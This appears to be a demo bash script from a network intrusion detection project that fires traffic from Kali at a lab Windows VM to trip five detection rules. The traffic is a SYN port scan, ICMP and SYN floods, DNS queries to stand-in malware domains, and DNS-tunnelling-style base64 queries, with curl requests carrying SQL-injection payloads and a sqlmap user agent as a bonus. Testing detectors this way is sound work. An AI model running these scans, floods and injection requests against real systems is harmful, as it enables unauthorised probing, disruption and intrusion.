#!/usr/bin/env bash
# =============================================================================
# kali_attack_demo.sh
# Sends packets from Kali to a Windows VM to trigger all 5 NIDS detection rules.
#
# Usage:
#   chmod +x kali_attack_demo.sh
#   sudo ./kali_attack_demo.sh <WINDOWS_VM_IP>
#
# Example:
#   sudo ./kali_attack_demo.sh 192.168.1.100
#
# Tools used (all pre-installed on Kali):
#   nmap, hping3, dig, curl
# =============================================================================

set -euo pipefail

# ── Colors ────────────────────────────────────────────────────────────────────
RED='\033[0;31m'
YEL='\033[0;33m'
GRN='\033[0;32m'
CYN='\033[0;36m'
BLD='\033[1m'
RST='\033[0m'

banner() { echo -e "\n${BLD}${CYN}══════════════════════════════════════════${RST}"; echo -e "${BLD}${CYN}  $1${RST}"; echo -e "${BLD}${CYN}══════════════════════════════════════════${RST}"; }
info()   { echo -e "${GRN}[+]${RST} $1"; }
warn()   { echo -e "${YEL}[!]${RST} $1"; }
atk()    { echo -e "${RED}[ATTACK]${RST} $1"; }

# ── Args ──────────────────────────────────────────────────────────────────────
if [[ $# -lt 1 ]]; then
    echo -e "${RED}Usage: sudo $0 <WINDOWS_VM_IP> [DNS_SERVER]${RST}"
    echo -e "       sudo $0 192.168.1.100"
    echo -e "       sudo $0 192.168.1.100 8.8.8.8"
    exit 1
fi

TARGET="$1"
DNS_SERVER="${2:-8.8.8.8}"   # DNS server to use for dig queries

# ── Privilege check ───────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script needs root (sudo) for raw packet tools (hping3, nmap -sS).${RST}"
    exit 1
fi

# ── Dependency check ──────────────────────────────────────────────────────────
for tool in nmap hping3 dig curl; do
    if ! command -v "$tool" &>/dev/null; then
        echo -e "${RED}[!] Required tool not found: $tool${RST}"
        echo -e "    Install with: sudo apt-get install -y $tool"
        exit 1
    fi
done

# =============================================================================
banner "NIDS Demo Attack Script"
echo -e "  Target  : ${BLD}${TARGET}${RST}"
echo -e "  DNS via : ${BLD}${DNS_SERVER}${RST}"
echo ""
warn "For educational/demo purposes only."
warn "Only run this against systems you own or have permission to test."
echo ""
sleep 2

# =============================================================================
# RULE-001 — Port Scan
# Default threshold: 20 unique TCP dst ports within 10 seconds
# Tool: nmap SYN scan across 25 ports with high rate
# =============================================================================
banner "RULE-001 · TCP Port Scan"
atk "SYN-scanning 25 unique ports at high rate to exceed 20-port threshold"

nmap -sS \
    -p 21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1723,3306,3389,5900,8080,8443,8888,9090,9200,9300 \
    --min-rate 300 -T4 -n --open \
    "$TARGET" 2>/dev/null || true

info "Port scan complete — 25 unique ports → triggers RULE-001"
sleep 2

# =============================================================================
# RULE-002 — ICMP Ping Flood
# Default threshold: 100 ICMP packets within 10 seconds
# Tool: hping3 raw ICMP burst (--fast ≈ 10 pps, -i u1000 = 1000 pps)
# =============================================================================
banner "RULE-002 · ICMP Ping Flood"
atk "Sending 120 ICMP echo requests in under 5 seconds"

hping3 --icmp -c 120 -i u5000 "$TARGET" 2>/dev/null || true

info "ICMP flood complete — 120 packets → triggers RULE-002"
sleep 2

# =============================================================================
# RULE-003 — TCP SYN Flood
# Default threshold: 100 SYN packets within 10 seconds
# Tool: hping3 SYN-only burst to port 80
# =============================================================================
banner "RULE-003 · TCP SYN Flood"
atk "Sending 120 bare SYN packets to port 80 in under 5 seconds"

hping3 -S -p 80 -c 120 -i u5000 "$TARGET" 2>/dev/null || true

info "SYN flood complete — 120 SYN packets → triggers RULE-003"
sleep 2

# =============================================================================
# RULE-004 — Suspicious DNS Query
# Triggers on: exact/subdomain match against malware.test, phishing.test,
#              or bad-domain.example (checked in the DNS query name field)
# Tool: dig — sends real UDP DNS queries that the NIDS captures on the wire.
# NOTE: Your NIDS must be sniffing on the interface that sees outbound DNS from
#       this Kali machine, OR the Windows VM must be acting as a DNS resolver.
# =============================================================================
banner "RULE-004 · Suspicious DNS Queries"
atk "Querying known-bad domains from the suspicious_domains watchlist"

SUSPICIOUS_DOMAINS=(
    "dropper.malware.test"
    "payload.malware.test"
    "steal.phishing.test"
    "login.phishing.test"
    "bad-domain.example"
)

for domain in "${SUSPICIOUS_DOMAINS[@]}"; do
    atk "  dig ${domain} @${DNS_SERVER}"
    dig +short +time=1 +tries=1 "$domain" @"${DNS_SERVER}" &>/dev/null || true
    sleep 0.3
done

info "Suspicious DNS queries sent — 5 queries → triggers RULE-004"
sleep 2

# =============================================================================
# RULE-005 — DNS Tunneling Suspicion
# Default threshold: 5 suspicious queries within 30 seconds
# A query is suspicious when ANY of these is true:
#   - Total query name length >= 100 chars
#   - A single label length >= 45 chars
#   - A label >= 24 chars with Shannon entropy >= 3.8 bits
# Tool: dig with crafted long, high-entropy base64-style subdomains
# =============================================================================
banner "RULE-005 · DNS Tunneling Suspicion"
atk "Sending 7 DNS queries with long high-entropy labels (data exfiltration signature)"

# Each label is ~55 chars of base64-style data → triggers 'long_label' (>= 45)
# and 'high_entropy_label' (high char diversity, entropy > 3.8)
TUNNEL_LABELS=(
    "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA"
    "dGhpcWlzYXZlcnlsb25nc3ViZG9tYWlubGFiZWxmb3J0ZXN0aW5n"
    "c3VzcGljaW91c2Ruc3F1ZXJ5Zm9ybmlkc2RlbW9wcm9qZWN0dGVzdA"
    "ZGF0YWV4ZmlsdHJhdGlvbnZpYWRuc3R1bm5lbGluZ2RlbW90ZXN0cQ"
    "bmlkc3Byb2plY3RkZW1vYXR0YWNrc2ltdWxhdGlvbnRlc3RsYWJlbA"
    "c2VtZXN0ZXJwcm9qZWN0aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtdA"
    "aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtZGVtb3Rlc3RsYWJlbHNnbg"
)

for label in "${TUNNEL_LABELS[@]}"; do
    FQDN="${label}.tunnel.example.com"
    atk "  dig ${FQDN:0:50}... @${DNS_SERVER}"
    dig +short +time=1 +tries=1 "$FQDN" @"${DNS_SERVER}" &>/dev/null || true
    sleep 0.5
done

info "DNS tunneling queries sent — 7 queries → triggers RULE-005"
sleep 2

# =============================================================================
# BONUS — HTTP Signature Attacks (Suricata rules)
# These trigger only if you've loaded Suricata rules with http.uri / http.user_agent
# matchers AND the Windows VM has an HTTP service running on port 80.
# =============================================================================
banner "BONUS · HTTP Signature Attacks (Suricata rules)"
warn "These require port 80 open on ${TARGET} and Suricata rules loaded in your NIDS."

HTTP_TARGET="http://${TARGET}"

# SQL Injection in URI  → matches: http.uri; content:"' or '1'='1"; nocase
atk "  SQL Injection in URI"
curl -s --connect-timeout 3 --max-time 3 \
    "${HTTP_TARGET}/index.php?id=%27%20OR%20%271%27%3D%271" \
    -o /dev/null 2>/dev/null || true

# sqlmap User-Agent     → matches: http.user_agent; content:"sqlmap"
atk "  sqlmap User-Agent"
curl -s --connect-timeout 3 --max-time 3 \
    -A "sqlmap/1.7.8#stable (https://sqlmap.org)" \
    "${HTTP_TARGET}/" \
    -o /dev/null 2>/dev/null || true

# SQLi in POST body     → matches: pkt_data / raw_data content rules
atk "  SQL Injection in POST body"
curl -s --connect-timeout 3 --max-time 3 \
    -X POST "${HTTP_TARGET}/login" \
    --data "username=admin&password=%27+OR+%271%27%3D%271" \
    -o /dev/null 2>/dev/null || true

info "HTTP attacks sent"

# =============================================================================
banner "All Attacks Sent!"
echo -e ""
echo -e "  ${BLD}Summary:${RST}"
echo -e "    ${RED}RULE-001${RST}  Port Scan        — nmap SYN scan, 25 unique ports"
echo -e "    ${RED}RULE-002${RST}  ICMP Flood       — 120 hping3 ICMP packets"
echo -e "    ${RED}RULE-003${RST}  SYN Flood        — 120 hping3 SYN packets to :80"
echo -e "    ${RED}RULE-004${RST}  Suspicious DNS   — 5 queries to malware/phishing domains"
echo -e "    ${RED}RULE-005${RST}  DNS Tunneling    — 7 long high-entropy label queries"
echo -e "    ${GRN}BONUS  ${RST}  HTTP Signatures  — SQLi URI + sqlmap User-Agent"
echo -e ""
echo -e "  ${BLD}On your NIDS host:${RST}"
echo -e "    View raw alerts : ${CYN}cat data/alerts.jsonl | python3 -m json.tool${RST}"
echo -e "    Open dashboard  : ${CYN}http://127.0.0.1:5000${RST}"
